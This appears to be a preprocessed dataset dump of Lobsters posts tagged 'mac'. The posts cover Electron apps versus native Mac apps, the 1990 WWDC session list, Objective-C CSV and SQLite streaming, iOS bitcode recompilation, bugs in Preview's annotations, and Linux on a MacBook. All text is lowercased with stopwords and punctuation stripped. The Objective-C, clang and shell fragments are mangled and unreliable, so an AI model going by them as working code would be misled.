native appsin way worst thing ever happened mac got much popular decade ago theory nothing good news platform user mean attention developer mac user mac apps see problem user really care good native apps user know hig violation see care performance care mac apps right mostly already mac lot newer mac user either know care make good mac appwhere see electron potential existential threat mac symptom popularity see something different unfoldingonce github codespaces product launch need use mac everyday alonein next three five year ipad poised become car steve job talked generalized device suitable average person daily life work home despite apple effort keep ipad lockeddown subscription based electron apps regular web apps finding way exist slowly replacing mac pconly workload onebyone accessory like ipad magic keyboard built trackpad close gap furtherparaphrasing gruber io enjoys benefit simplicity ease use mac absorbs complexity must exist ecosystem believe ipados soon platform absorbs different kind complexity multiplatform service disguised appsif trend continues gruber may actually get want macos become mighty truck highly specialized device featuring heavyduty battletested apps discerning user user recognize value great software willing pay hundred dollar short want everywhere want rightbringing inevitable future analogy life imagine gruber peering steering wheel sturdy mac k truck watching daily ipad commuter swerving erratically around view windshield perfectly clear save reflection
56,Lobsters,mac,Apple macOS,Looking Back at WWDC 1990,http://bslabs.net/2020/06/19/wwdc-1990/,looking back wwdc,newsgroup post system aux released soon june macintosh iifx apple iigs system microsoft window tidbit infoworld appleproduced vhs tape conference david greelish documentary apple lisa prebuy wwdc movie wwdc real story one serving overall cataloglauncher presentation internet archive server philip schiller monday track system software overview roger heinen steven goldberg virtual user automated testing tool jay jessen overview developer program overview navigating applelink john mracek moira martin jessa vartanian louella pizzuti application opportunity system glen fiance monday track hf multitasking virtual memory dave feldman david harrison joe buczek taking advantage finder paul hudspeth phac le tuan scott douglas david owen john sullivan john meier monday track building cooperative application using macworkstation norman kline mactcp overview developing application using tcpip network pl wan john veizades overview network application tool alex knight doug mclean getting mpw jordan mattson tuesday track interapplication communication overview thomas ryan overview apple computer alpha partner technology venture investor kleiner perkins caufield byers barry schiffman paul c ely john r johnston e floyd kvamme macamerica macwarehouse ingram micro martin fishman marc williams charles b bagwell higher education education anita szewczak field market research commando school pat bentley dan rubin appmaker prototyper macintosh allegro common lisp spec bower c randy hill daniel n hennessy application direction future david szetela tuesday track edition manager tom ryan scott jenson nick kledzik event ppc jay moreland appleevents mike farr ppc toolbox c victor chang claris common knowledge k harvey scott wiener installer tip technique bruce jones tuesday track past present future family michael slater design element object programming neal goldstein macintosh allegro common lisp update laura clark wednesday track apple iigs system software update greg branche jim mensch jim merritt apple iigs graphic animation technique jim mensch sound spectacular new apple iigs sound tool mark cecys braz apple iigs programming tim swihart overview human interface eric soldan matt deatherage parallel development sample code ck haun eric soldan dave lyon eric soldan dave lyon wednesday track hardware software rich see collyer dave radcliffe system compatibility cookbook john harvey quickdraw companion slide macintosh display card gc interchange capability bruce leak konstantin othmer jeancharles mourey jon magill printing macintosh today michael hopwood scott zimmerman truth truetype jim stoneham john harvey dev opportunity publishing presentation philip schiller wednesday track development opportunity technical market sunil chawla apple claris aldus pamela beezley william holtzman john claris transpac apple joe bosurgi ken krugler joel cannon european unification france sweden germany fredric abramson philippe haustãªte jan jivmark michael rathmann overview symantec datacomm systemsoft softrans legal issue mimi obinata chris langewis barbara fox sharon akemi doi brian kelly fredric abramson introduction script claris system software mark e davis peter edberg joe bosurgi michael wallace wednesday evening address alan kay thursday track extended xcmd architecture dan corenzwit design principle multimedia product kristina hooper fabrice florin kristee kreitman steve gano margo nanny macapp report tom chavez steve friedrich c report tim swihart preston gardner jack palevich thursday track introduction guideline color macintosh interface writing balloon help aux human interface bob glass scott jenson paulien strijland jim palmer gentner database access sql tom ryan jeff miller vincent lo mike wallace using alias manager phac le tuan paul hudspeth prashant patel using help manager phac le tuan jim palmer randy carr thursday track overview appletalk phase appletalk routing appletalk license program john mason alan oppenheimer louise laier dana harrison software application shared environment dan j torres ruth hennigar advanced tip technique lance hoffman jim groff macintosh debugging tip dts master mark bennett macintosh communication toolbox veronica dullaghan byron han isdn pl wan tim kreps rus winsper joe hingston tom everman steve herrington friday track integrating sound application user interface note eileen hart neil cormia michael arent still video technology apple medium integration rick warner doug camplejohn informating product application environment electronic information service adding value information scott mize larry kwan charles brady richard lim marketing role perspective john klem thomas p rielly apple iigs medium integration doug camplejohn dan hitchens friday track aux technical insight mike chow joe sokol steve peter winston hendrickson write aux driver rob smith john sovereign aux opportunity market opportunity aux c clettenberg howard green friday track object programming think c think pascal mada macapp scsi installers david neal carl nelson mcp arose robert breuninger david comstock,although circumstance unfortunately forced upcoming worldwide developer conference onlineonly thought would fun look back year wwdc second conference held first cd published may apple computer held secondever worldwide developer conference thennew san jose convention center san jose ca newsgroup post indicates attendance fee per day hotel available night historical context macintosh system introduced year earlier wwdc would publicly released year later may major focus conference aux previously announced released soon june macintosh iifx also released spring apple iigs system released several apple iigsrelated session also interesting microsoft window considered first usable version window released day later may tidbit infoworld covered event time admit burying lede bit year ebay found appleproduced vhs tape conference technical first half broll attendee convention center second half cringey walkaround conference video peak watch big thanks david greelish capturing vhs tape working documentary apple lisa look fantastic prebuy wwdc movie wwdc real story video transported san jose time presentation conference disc volume thennew developer cd series included slide presentation well two hypercard stack one serving overall cataloglauncher presentation another holding full directory attendee downloaded inconvenient mdfmds format internet archive server cdr addition presentation originally created powerpoint converted pdf using powerpoint adobe acrobat pdfwriter running o x recognized one presenter still household name apple enthusiast one philip schiller credited session cover wide range topic mac system aux apple iigs networking development tool hardware businessmarketing enjoy monday track system software overview start comprehensive overview system feature presentation people create product market prelude technical presentation delivered conference find navigate conference presentation cd presented roger heinen vp software engineering steven goldberg product manager virtual user automated testing tool presentation tell virtual user important new tool simplifies testing complex application software learn prepare script automate testing procedure release healthier product schedule presented jay jessen virtual user lead navigating apple maze overview developer program overview navigating applelink ever apple question know call presentation show rope dealing apple including overview company apple developer group service way apple help example know way send information every appleauthorized dealer presented john mracek evangelism moira martin developer program manager jessa vartanian developer program applelink program manager louella pizzuti developer press application opportunity system system open application outside influence implementing iac architecture database access manager tool create opportunity sharing data controlling application accessing data remote system presentation show use system capability creative exciting way reach new market presented glen fiance system evangelist monday track new capability mac o hf multitasking virtual memory technically meek presentation teach new capability macintosh operating system system gain insightful programming tip technique take advantage presented dave feldman macintosh o group late night hf david harrison denture wearer joe buczek virtual engineer taking advantage finder everything need know take advantage new finder capability included presentation find use new icon family new system subfolders finder appleevents also cover finderrelated human interface issue presented paul hudspeth finder product manager phac le tuan engineering manager macintosh system software scott douglas david owen finder engineering john sullivan macintosh human interface group john meier finder engineering monday track building cooperative application using macworkstation presentation describes new capability macworkstation product teach design prototype build cooperative application mws dialog builder event handler across multiple communication network multiple host environment presented norman kline n c worldwide product marketing macintosh tcpip environment mactcp overview developing application using tcpip network tcpip defacto standard networking protocol sure new standard coming want miss opportunity presentation describes mactcp interface topology medium support relates appletalk add mactcp support effort presented pl wan john veizades sr engineer network system engineering collaborative application overview network application tool people work together application presentation allow explore collaborative application n c tool enabling give full overview including idea make existing product collaborative new product created idea collaboration choose tool apple provides help create application also give road map n c presentation cd help learn tool presented alex knight evangelism productivity evangelist doug mclean product marketing manager getting mpw see new macintosh workshop learn use work faster smarter presentation preview integrated help system let slip straight inside macintosh information without leaving confines editor presented jordan mattson development tool product marketing mpw product manager tuesday track interapplication communication overview presentation offer techie marketer alike quick thorough understanding interapplication communication architecture presented thomas ryan system software meet venture capitalist overview apple computer alpha partner technology venture investor kleiner perkins caufield byers believe everything read still venture capital available good technology idea company host presentation included tell attract investment information provide kind product company look kind term expect presented barry schiffman acting director corporate developmentventure capital apple computer paul c ely alpha partner venture capital seed financing john r johnston partner technology venture investor e floyd kvamme general partner kleiner perkins caufield byers getting product customer macamerica macwarehouse ingram micro getting product user becoming difficult presentation included tell get attention distributor learn different approach market product determine product fit best latest distribution channel trend presented martin fishman vice president general manager macamerica marc williams directorspecial project macwarehouse charles b bagwell director general manager mac development opportunity education market higher education education dedication education market strong ever highlight view opportunity higher education share idea application would like see created leave understanding apple think important perhaps insight product plan presented anita szewczak manager strategic market field education solution marketing manager market research commando school confused number keep seeing macintosh market presentation teach ass opportunity becoming market research commando show get number gather market easily presented pat bentley dan rubin customer research group worldwide marketing prototyping tool appmaker prototyper macintosh allegro common lisp presentation teach reduce development time prototyping tool automatic code generator also covered use macintosh allegro common lisp prototyping tool presented spec bower bower development corp president c randy hill software inc development tool group daniel n hennessy senior scientist lockheed ai center application direction future future application look like presentation focus direction application developer pursue also outline technology capability apple encourages developer incorporate application presented david szetela developer service manager tuesday track edition manager presentation teach incorporate key iac feature application free user repetitive cutcopypaste operation creating link application allows data dynamically shared important presentation wishing take full advantage system presented tom ryan engineering manager scott jenson human interface group nick kledzik edition manager engineer event ppc presentation teach create application communicate others using capability event manager learn appleevents use must want learn work application presented jay moreland macintosh o engineer appleevents appleevents interapplication messaging mechanism presentation describe work learn minimal event need application take full advantage feature understanding prerequisite getting system presented mike farr appleevents engineer ppc toolbox ppc toolbox gut iac architecture presentation show use work application across network even show might need powerful toolbox manager even going network presented c victor chang manager collaborative application toolbox developer talk future iac claris common knowledge presentation share experience developer already beginning adopt iac outline trial triumph creating nextgeneration application presented k harvey claris scott wiener ceo common knowledge inc installer tip technique presentation teach use latest edition macintosh o installer apple share secret advanced technique writing good installer script learn improve installation must every developer whether commercial custom presented bruce jones avalanche surfer tuesday track past present future family michael slater editor authoritative industry newsletter microprocessor report expert family share past present future presentation also covered future applies design element object programming based popular twoday developer university course presentation cover principal element software design need know fulfill potential object programming teach practical tip making source code easily transportable application designing software efficiently presented neal goldstein president neal goldstein design inc macintosh allegro common lisp update recent development macintosh allegro common lisp plan future presentation show developer using lisp prototyping research project commercial application development presented laura clark development tool product marketing lisp product marketing manager bill st clair macintosh allegro common lisp lisp hacker atg cambridge matthew maclaurin siac sqa lead wednesday track apple iigs system software update last year apple released networkaware apple iigs system added resource manager textedit tool presentation teach latest apple iigs toolbox driver enhancement system software direction product development tip ensure ongoing compatibility presented greg branche apple ii system software software engineer jim mensch apple ii system software engineer jim merritt apple ii system software appl utility group manager presbyte apple iigs graphic animation technique learn screen blaze apple iigs color animation tool technique detailed apple iigs engineering presentation presented jim mensch apple ii system software senior engineer sound spectacular new apple iigs sound tool presentation teach build apple iigs sound tool believe versatility ease use sound software presentation iigs sound engineer give detail presented mark cecys braz apple iigs sound group engineering testing apple iigs programming presentation teach powerful tool available developing apple ii apple iigs product save dollar hour leaving time breakthrough creativity win award contract technical survey tool utility macintoshtoapple iiapple iigs crossdevelopment language prototyping tool parallel development aid presented tim swihart development tool product marketing apw mpw iigs product manager apple iigs programming strategy overview human interface presentation packed apple iigs program modeling machine efficiency human interface outline optimal program structure segmentation along design guideline minimize debug time also tell easy make application presented eric soldan apple ii dts engineer matt deatherage apple ii developer technical support keeper general truth parallel development exploration parallel development g macintosh presentation sample code provided designed give introduction easy way broaden market application g macintosh toolbox standpoint similar understanding taking advantage similarity design application run platform minimal source code change two application one set source code goal reduction programming time debugging time testing time pay presentation cover thought process involved touch area toolbox need special consideration handling sample code simple game show basic parallel programming technique consideration contains code build script let build mac g version sample code demonstrates menu window dialog printing event handling sound quickdraw feature welltempered application need presented ck haun dts engineer apple ii developer tech support advanced apple iigs debugging eric soldan dave lyon presentation discus bugbusting tip apple iigs combine tip learn gsbug gsos snooper gsos exerciser debugging aid elusive bug stand chance presented eric soldan apple ii dts engineer dave lyon developer technical support wednesday track designing apple o independence hardware software tired rewriting application new system version presentation teach design practice ensure application run apple operating system current future including aux presented rich see collyer developer technical support color test pilot dave radcliffe developer technical support technical sherpa system compatibility cookbook already made big investment application learn make application compatible system also learn keep application breaking presented john harvey macdts macintosh graphic today quickdraw companion slide macintosh display card gc interchange capability presentation outline current state macintosh graphic including tip incorporating newest hardware software advance heavy concentration offscreen technique maintaining compatibility presented bruce leak konstantin othmer macintosh system software graphic group jeancharles mourey system extension group rocket jon magill graphic system software product manager printing macintosh today presentation discus in out printing macintosh today mustview presentation work extensively printing write printer driver presented michael hopwood printer product marketing printing software scott zimmerman mac dts truth truetype presentation focus two area first portion update technology specific detail enhance application incorporating truetype functionality font provider driver writer look variety state tool available creating truetype font also addressed implementation detail using truetype printer driver presented jim stoneham product manager john harvey macdts dev opportunity publishing presentation desktop publishing presentation capability macintosh wellknown presentation discus additional capability customer want apply new technology satisfy demand presented philip schiller multimedia specialist wednesday track development opportunity technical market office computer engineer scientist technical people discovering power macintosh presentation tell application want engineering cadcam visualization presented sunil chawla design modeling ausa marketing success pacific apple claris aldus gaining market acceptance increasing market share requires simply great localized product presentation focus key factor making product successful pacific market topic include choose work localizationdistribution partner marketing strategy country specific consideration presented pamela beezley apple far east developer service manager william holtzman pacific region general manager claris corporation john aldus pacific rim director designing software japan far east claris transpac apple fastest growing market asia asian market demand asian solution presentation tell develop software meet need user japan china korea find use new asian commontalk system software new script manager improved text edit creating product quickly easily localized presented joe bosurgi manager international linguistic engineering claris corporation ken krugler president transpac software inc joel cannon developer technical support apple japan marketing success europe european unification france sweden germany sweeping change make european market easier tougher crack presentation expert tell need know marketing europe share phenomenal success presented fredric abramson attorney law philippe haustãªte market development manager apple france jan jivmark party manager apple computer sweden michael rathmann manager developer service apple germany business localization overview symantec datacomm systemsoft softrans legal issue interested taking product international market know start six presentation expert outline different business option localizing product pacific european market presented mimi obinata international engineer apple computer chris langewis international product manager symantec inc barbara fox president datacomm inc sharon akemi doi executive director systemsoft corporation brian kelly founder ceo softrans international ltd fredric abramson attorney law technical challenge international design introduction script claris system software presentation international gearheads show technique handling twobyte text processing mystery online input mixed direction style much presentation also discus international development platform reveal future functionality presented mark e davis international system software manager peter edberg project lead script manager joe bosurgi manager international linguistic engineering claris corporation michael wallace product manager international system software wednesday evening address alan kay thursday track extended xcmd architecture latest information using extended xcmd architecture presentation must anyone writing xcmds hypercard presented dan corenzwit vice president engineering mitem design principle multimedia product new class multimedia product generating excitement across industry challenging understanding traditional design principle presentation expert convey principle developed learned adopted illustrate applied principle outstanding multimedia product presented kristina hooper director apple multimedia lab fabrice florin producerdesigner kristee kreitman art directordesigner steve gano lead designer margo nanny teacherdesigner macapp report presentation teach important new feature recently released macapp version also discus two new tool mouser macapp browser macapp encyclopedia stack macapp team also share plan supporting system presented tom chavez development tool product marketing steve friedrich user programming group c report presentation teach c system evolved since release last year learn variety practical c programming tip including technique minimizing build time use macapp class library c highlighted presented tim swihart development tool product marketing mpw c product manager preston gardner development system group c lead engineer jack palevich adv tech group cmacapp pioneer thursday track system human interface guideline introduction guideline color macintosh interface writing balloon help aux human interface presentation review human interface related finder edition manager truetype font broken separate section specific section finder review use new icon family icon design popup menu appearance layermodal dialog section edition manager cover publish subscribe menudialog language edition behavior option icon truetype section review cover font size independence application presented bob glass manager macintosh human interface scott jenson human interface guy macintosh human interface group paulien strijland human interface designer macintosh human interface jim palmer instructional designer instructional product gentner human interface design aux engineering database access sql addition two call software open whole new world opportunity presentation teach broaden capability overview database access manager show move beyond access sql database presented tom ryan jeff miller vincent lo mike wallace using alias manager presentation overview tutorial system alias manager allows application track location file presented phac le tuan manager macintosh system software paul hudspeth product manager seen tv prashant patel system software engineer using help manager presentation teach use system help manager incorporate feature application also talk human interface guideline help manager presented phac le tuan system software jim palmer instructional product randy carr system software thursday track appletalk status macintosh implementation overview appletalk phase appletalk routing appletalk license program presentation allow gain comprehensive detailed understanding appletalk protocol stack macintosh including appletalk phase ii adsp also learn plan license portable appletalk review current product licensed presented john mason network connectivity development alan oppenheimer louise laier dana harrison appletalk product line manager n c product marketing software application shared environment presentation teach guideline creating application compatible appleshare macintosh fileshare presented dan j torres appleshare product manager ruth hennigar appleshare engineering manager advanced tip technique presentation share information developer project way developed team give information need specific application presented lance hoffman product manager n c product marketing jim groff president network innovation corp macintosh debugging tip dts master macdts engineer people turn debugging miracle dime share secret presentation teach common macintosh programming problem symptom prevent happening ever seen unexpectedly quit etc presentation presented mark bennett developer technical support feature remover macintosh communication toolbox application need powerful data communication capability prosper presentation allow gain understanding macintosh communication toolbox add capability existing new application presentation cover architecture capability limitation presented veronica dullaghan product manager n c product marketing byron han communication toolbox project scapegoat wan networking tool isdn local area network enough anymore people want communicate broader geographic area easily locally presentation discus wide area network tool work tell create interface application using communication toolbox presented pl wan tim kreps networking communication evangelism rus winsper manager isdn development comm product development joe hingston hardware engineer comm product development tom everman isdn software team leader comm product development steve herrington ivd software team leader comm product development friday track integrating sound application user interface note music ear developer want add dimension sound macintosh application presentation review added feature newest version sound manager oulines use well cd rom make sound integral part application presented eileen hart neil cormia software engineer system software engineering michael arent human interface designer advanced technology group integrating image application still video technology apple medium integration expressive power image requires change developer think application making multimedia product presentation teach tool apple others help incorporate still image video macintosh application also update image compression development presented rick warner technical coordinatorstill video division canon usa inc doug camplejohn product manager video integration product adding value product information informating product application environment electronic information service adding value information personal computing beginning emphasize merger tool text image database clip art significantly differentiate product presentation teach different type content well application cd rom product blend software documentation tutorial utility single environment also discus go forging alliance add even greater value product presented scott mize multimedia content evangelist apple computer inc larry kwan cdrom product specialist medium integration product marketing charles brady executive director advanced system dow jones information service richard lim project manager lotus development corporation new medium product marketing distrubution issue marketing role perspective wealth new medium product appearing variety product category effect new product way market choice distribution channel learn issue presentation developed people tackling issue today presented john klem marketing manager thomas p rielly director marketing farallon computing inc apple iigs medium integration presentation teach mix video apple iigs graphic integrate medium application also reveal treasure apple ii video overlay card presented doug camplejohn product manager video integration product dan hitchens software engineer apple ii system software friday track aux technical insight presentation apple team show specifically macintosh application work aux learn aux implement multifinder toolbox file system presented mike chow joe sokol steve peter winston hendrickson aux engineering project leader write aux driver aux support peripheral never easier learn new aux version implement existing hardware manager presentation show take advantage new resource simplify driver presented rob smith john sovereign aux product development business opportunity aux aux opportunity market opportunity aux interest unix true aux presentation teach objective aux channel program company prosper growing business opportunity presented c clettenberg howard green friday track object programming inside object programming think c think pascal mada macapp scsi installers everything ever wanted know object design principle debugging presentation discus advanced technique use browser inspector effectively several trick trade run range object pascal c think pascal think application framework including macapp think class library presented david neal senior software engineer symantec language group carl nelson founder vp development software architect inc also founder president mada mcp arose complete description mcp card arose operating system explanation license two presentation show facility apple give nubus development use mcp card application presented robert breuninger application engineering manager datapath vlsi product texas instrument inc david comstock senior software engineer apple computer inc
57,Lobsters,mac,Apple macOS,"Beyond Faster JSON Support for iOS/macOS, Part 9: CSV and SQLite",https://blog.metaobject.com/2020/06/beyond-faster-json-support-for-iosmacos.html,beyond faster json support iosmacos part csv sqlite,csv parsing gtfs h sqlite fmdb,looking mpwpliststreaming protocol using json parsing series one thing probably noticeable nt particularly jsonfocused fact nt even initially designed parsing generating could use deserialization task glad asked csv parsing one example performance book involves parsing comma separated value quickly within context getting time convert gtfs file something usable phone minute using using coredatasqlite slightly le second using custom inmemory data structure also several order magnitude faster query ondevice original project cv parser took around second nt significant part minute rest took couple hundred millisecond time make part faster well result slightly generalized mpwdelimitedtable h basic interface blockbased block called every row table called dictionary composed header row key content row value void void nsdictionary thedict int anindex block adapting mpwpliststreaming protocol straightforward void writeonbuilder id builder builder beginarray self nsdictionary thedict int anindex builder begindictionary nsstring key selfheaderkeys builder writeobject thedict key forkey key builder enddictionary builder endarray quickanddirty implementation based existing api clearly suboptimal api call first construct dictionary row header key iterate however work existing set builder nt build inmemory representation entire csv also relatively straightforward invert api usage modifying lowlevel api use mpwpliststreaming creating higherlevel block dictionaybased api top way also work mpwpliststreaming client sqlite another tabular data format sql data base macosios one common database sqlite usually accessed via coredata excellent much lightweight fmdb used fmdb bing quite delighted first impulse write mpwpliststreaming adapter looking code bit closely seemed quite bit would need mpwpliststreaming also think saw tradeoff convenient slow convenience based nsdictionary much complex potentially faster api based pulling individual type value instead decided try something ultra simple sits directly top sqlite capi implementation really quite simple compact interface mpwstreamqlite property nonatomic strong nsstring databasepath end implementation mpwstreamqlite db instancetype initwithpath nsstring newpath self super init selfdatabasepath newpath return self int exec nsstring sql re int rc db sql re autoreleasepool selfbuilder beginarray int step int re nsstring key numcols int numcols key re sqliterow step re autoreleasepool selfbuilder begindictionary int numcols const char text const char re text selfbuilder writeobject text forkey key selfbuilder enddictionary re selfbuilder endarray return rc int open return selfdatabasepath db void close db db dbnull course nt lot chiefly read update insert deletes however code striking brevity simplicity time convenient fast though still room improvement experience tend get three property time code simple convenient tends slow code convenient fast tends rather tricky code simple fast tends inconvenient use easy use following code turn table array dictionary import mpwfoundationmpwfoundationh int main int argc char argv mpwstreamqlite db mpwstreamqlite alloc initwithpath chinookdb dbbuilder mpwplistbuilder new db open db exec select artist nslog result dbbuilder result db close else nslog ca nt open database sn db error return pretty good probably roughly par course returning generic data structure array dictionary going particularly efficient one first clue coredata predecessor eof nt particularly fast read fetching raw dictionary optimization much faster fetching object want get object instead easy replace mpwplistbuilder mpwobjectbuilder parametrized class create well define class presumably already havee task convert object class cold obviously also automated import mpwfoundationmpwfoundationh interface artist nsobject property assign long artistid property nonatomic strong nsstring name end implementation artist nsstring description return nsstring stringwithformat self class self selfartistid selfname end int main int argc char argv mpwstreamqlite db mpwstreamqlite alloc initwithpath chinookdb dbbuilder mpwobjectbuilder alloc initwithclass artist class db open db exec select artist nslog result dbbuilder result db close else nslog ca nt open database sn db error return note generate plist representation intermediate step go straight database result set object generic intermediate format mpwpliststreaming protocol dematerialized representation plist object peer
58,Lobsters,mac,Apple macOS,Search and combine Brewfile templates,https://brewfile.info/,search combine brewfile template,,
59,Lobsters,mac,Apple macOS,Translating an ARM iOS App to Intel macOS Using Bitcode,https://www.highcaffeinecontent.com/blog/20190518-Translating-an-ARM-iOS-App-to-Intel-macOS-Using-Bitcode,translating arm io app intel macos using bitcode,introduced bitcode bitcode objectivec ebcutil statically translate binary intel arm include bitcode marzipanify,apple introduced bitcode made mandatory watchos tvos kinda handwaved away question existed nebulous claim useful tuneup binary utilizing latest compiler improvement since bitcode proven instrumental seamless overnight transition watchos developer nt even need recompile apps store apple transparently could run apple watch series likely nt even notice transition taken place bitcode well bitcode small b architecturespecific intermediate representation used llvm capitalb bitcode pertains set feature allowing embed representation macho binary mechanism provide apple app store submission flexible source code far flexible built binary metadata annotation compiler practice apple easily take bitcode blob app recompile fullyfunctioning copy app going piece cake save developer recompile everfatter binary every time apple tweak arm chip bitcode longsince used apple opengl driver driver optimize fly various gpu architecture apple support seen microsoft use static recompilation great effect xbox one giving access whole library originallypowerpc xbox game without developer intervention access source code without intermediary like bitcode trivialize process course specter macos arm public psyche many year many pondered whether bitcode make transition straightforward commonly held belief bitcode suited massive architectural change like moving intel arm unconvinced decided test theory firstly need objectivec hello world app bitcode bitcode usually included building archive app store need force inclusion regular build use fembedbitcode flag custom build setting bitcodegenerationmode bitcode build binary generic io device attached device like normal bitcode nt seem embedded build ie device might want turn active architecture setting build directly using tool called ebcutil easily extract bitcode object compiled binary ebcutil e pathtomyappappmyapp bitcode object recompile intel f clang arch c xclang disablellvmpasses emitllvm x ir isysroot applicationsxcodeappcontentsdeveloperplatformsiphonesimulatorplatformdevelopersdksiphonesimulatorsdk f fo done want link compiled blob back binary clang arch isysroot applicationsxcodeappcontentsdeveloperplatformsiphonesimulatorplatformdevelopersdksiphonesimulatorsdk pathtomyappappmyapp succeeds intel version app able drop directly io simulator window install verify run important proof statically translate binary intel arm include bitcode really work gotchas morecomplex project arc appears use inline assembly mean need disable arc project translation succeed right certain kind block like completion handler also seem trip compiler instruction refuse accept see error likely issue objectivec well swift designed arc mind thus dont believe way avoid aforementioned inline assembly recompilation fail currently take step use marzipanify convert intel io app mac app run using marzipan easy mean theory apple wanted every io app app store run mac today future mechanism transparently without needing developer update recompile apps mac switched using arm chip instead intel well see apple could use bitcode translate every bitcodeenabled app mac app store without consulting developer would ready go day one kind power mean apple preannounce arm switch year ahead time also mean technology like rosetta may completely unnecessary time round obviously yet apple nt enable bitcode submission mac app store today bitcode may ideal architectural translation apple would make sure two thing change soon surely mandate bitcode marzipan apps macos
60,Lobsters,mac,Apple macOS,How Preview mangles annotations,https://eclecticlight.co/2020/04/07/how-preview-mangles-annotations/,preview mangle annotation,highlight text annotation export pdf save like,year ago apple decided completely rewrite support pdfs pdfkit new version broke lot existing code developer forced work around bug among apps apple preview one obvious result preview acquired bug handling pdfs really recovered yet preview course serious pdf editor many use read pdfs add annotation particularly demanding requirement even catalina preview version remains mess upsetting bug take tool annotate document open copy regular pdf preview use highlight text command annotation highlight several section text save document open chance preview forgotten last highlighted section select last highlighted text suddenly remembers thirdparty apps appears final highlighting tacked onto end pdf code preview seems forget select section text highlight select something else select highlighted section click highlight tool popup right tool toolbar sometimes applies different highlight colour even selected popup time remove highlighting altogether select unhighlighted text sometimes highlighting reappears spontaneously highlighting still also force vanish furthermore preview let close document even still indicates saved without saving silently lead absurd situation save document highlight often forgets last save document seems save even want one problem preview annotation becomes apparent browse source pdf annotated example using free app podofyllin individual annotation added another trailer end source removed document get purged file cleanup single paragraph two highlighted section two underlined ended trailer containing entire historical record previous annotation seemed unable forget consolidated flattened pdf rendered engine something preview reflect pdf export pdf even using save flatten pdf want make preview annotation robust reliable thus export pdf create cleanedup version document inconveniently also strip previous version document want annotate pdf document recommend look pdf expert pdfpen pro available app store fine native mac apps far better create fine pdf source really afford pay good quality software always adobe acrobat reader happen like martian human interface thanks hunter reminded time bend mind preview like like loading related
61,Lobsters,mac,Apple macOS,Running Linux on my Macbook,https://djhworld.github.io/post/2020/06/07/running-linux-on-my-macbook/,running linux macbook,rationale window manager maim software dotfiles installation alex dzyoba keyboard woe copy paste problem lot tinkering display retina doug beney brightness tuning askubuntu post please go sleep josh sherman systemd service script enable farewell firefox tree style tab alacritty redshift flux dropbox joe roback visual studio code gimp joy note swaywm rendered via xwayland systemd dnf annoyance wifi sometimes drop webcam reverse engineering effort going browser hardware video acceleration patched version chromium browser vendor see top priority osxlinux difference screenshot editing pbcopypbpaste spotlightalfred notification dunst airdrop work overall running macbook model,sunday june obligatory desktop shot nothing another one post one linux desktop apologist urge justify world thing go week ago installed fedora macbook pro early model post hope document pitfall trap joyous moment found along way complete annoyance come tolerate preface post saying issue encountered minimalist nature setup gone take reflection fedoralinux suspect default gnome come lot le footguns rationale main reason switch one killer app window manager keyboard shortcut tiled window lightning fast use feel like piece software designed people tinker use computer lot since installing tweaked configuration take screenshots keyboard shortcut similar osx using maim always open web browser workspace remove title bar scratchpad window make note taking joy generally joy use favourite feature scratchpad bring dismiss window workspace via keyboard shortcut absolute blast custom note taking software wrote mount via fuse writing note joy context switch minimal software meteoric rise web browser platform made realise really use much native gui software anymore seemed use osx web browser visual studio code terminal lot clitui software configured via set dotfiles huge gamer heart fortunate enough beefy gaming pc set console meet need really comment linux support side thing switching o really much barrier use case installation installation bit anxiety inducing start one thing want screw boot partition mac case thing went bit wrong took search way cleanly thankfully alex dzyoba wrote excellent article creating appropriate partition dual booting done mostly seemed work wifi worked sound worked installed applied dotfiles got going keyboard woe first issue encountered trying get keyboard setting work macbook layout especially gb localised keyboard tuning recognise like cap lock ctrl switched solved setxkbmap run login setxkbmap layout gb model applelaptop variant mac option ctrl swapcaps additionally sometimes throw laptop onto desk plug external keyboard apple branded also need additional tuning plug altwindows key swapped reason setxkbmap layout gb model applelaptop variant mac option altwin swaplaltlwin option ctrl swapcaps took reach setting happy copy paste problem moving osx linux mean throwing away year muscle memory keyboard shortcut cmdc cmdv clipboard work without lot tinkering seem worth effort pull band aid instead got happen time train go back using ctrl modifier key tricky first amazing quickly adapted annoying part remember hit shift key copyingpasting terminal display mentioned previously often plug laptop external monitor like keyboard tweaking took lot effort one position laptop external monitor like layout abovebelow took age try find decent xrandr setting support every time tried monitor bled laptop screen eventually found excellent tool arandr present gui interface generate appropriate setting arandr unfortunately found way automatically applying setting unpluggingplugging monitor write script run switching also includes setxkbmap setting described xrandr output primary mode po rotate normal output scale mode po rotate normal retina get everything scaling nicely laptop took bit effort thankfully doug beney wrote decent guide simple implement brightness tuning easy take granted something simple changing brightness screen took figure thankfully using guidance askubuntu post setting config setting able make brightness key work roughly way would expect screen brightness control bindsym exec xbacklight inc bindsym exec xbacklight dec please go sleep closing lid laptop suspend o never seemed work often find machine state hot panic next morning minute battery left solve thanks excellent post josh sherman need prevent usb controller waking system unfortunately need apply setting every time boot wrote systemd service script enable farewell firefox probably depressing part switching long time firefox fan especially extension like tree style tab acted enabler tab hoarding vice unfortunately linux dogshit absolute dogshit slow take age start website render really slowly switching tab feel lethargic like fire fox gone tried everything fix changing thing config trying firefox nightly enabling webrender nothing seemed working contrast google chrome lightning fast really night day linux foray sadly go big g alacritty terminal slick fast great font rendering redshift act like flux osx meaning eye get burnt night dropbox easy set especially adding systemd service thanks joe roback visual studio code unsurprisingly problem gimp work fine screenshot editing little cumbersome joy getting everything working way like kinda work blast use switching workspace moving window getting used tiling little bit learning curve meant using mouse much le additional benefit fast everything feel might matter perception sometimes perception matter writing blog post note aware swaywm config compatible run wayland tried seems neat would probably solve keyboardmonitor issue described retina display chrome look really blurry guessing rendered via xwayland resolved look making switch systemd systemd get lot flak community really really like already written service perform task run software installed configsystemduser trivial write getting used tooling hill climb feel much better old day initd script dnf use fedora machine headless mode fairly used tooling nice decent package manager generally keep everything date homebrew osx heroic effort annoyance wifi sometimes drop able figure one maybe twice week wifi driver stop working fix issue command reload kernel module sudo modprobe r brcmfmac sudo modprobe brcmfmac webcam sometimes use skype zoom communicate family member webcam work box look like reverse engineering effort going remedy found ipad work decent video calling device gotten around fixing browser hardware video acceleration web browser linux straight support gpu video acceleration became apparent investigating laptop panting expelling enough heat cook egg watching youtube video egg apparently patched version chromium supposedly support time look like browser vendor see top priority shame oh well installing vlc intel driver work though osxlinux difference thing immediately missed osx world mostly appear linux equivalent workarounds screenshot editing osx nice take screenshot immediately jump inbuilt editor add annotation adjustment somewhat replicated maimgimp pbcopypbpaste commandline tool interact clipboard linux equivalent xclip spotlightalfred really used quick calculator never made much use file searching feature firing terminal altenter using bc seems reasonable equivalent might see binding hotkey notification setting dunst offer good enough 